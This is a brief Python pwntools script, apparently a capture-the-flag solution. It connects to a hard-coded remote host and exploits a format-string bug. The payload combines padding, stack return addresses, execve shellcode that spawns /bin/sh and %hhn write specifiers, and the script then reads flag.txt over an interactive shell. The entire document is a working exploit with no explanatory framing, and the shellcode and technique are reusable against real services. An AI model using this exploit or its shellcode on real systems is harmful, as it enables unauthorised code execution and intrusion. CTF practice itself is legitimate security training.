from pwn import *
import struct

r = remote('45.77.252.244', 2225)

padd = "a"*136
ret = struct.pack("<L", 0xffffdafc) + struct.pack("<L", 0xffffdafd) + struct.pack("<L", 0xffffdafe) + struct.pack("<L", 0xffffdaff)
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
format_str = "%388x%52$hhn%43x%53$hhn%36x%54$hhn%256x%55$hhn"
payload = padd + ret + shellcode + format_str

r.sendline(payload)
r.sendline("cat flag.txt")
r.interactive()

#Flag: efiens{the_art_of_formatstring}
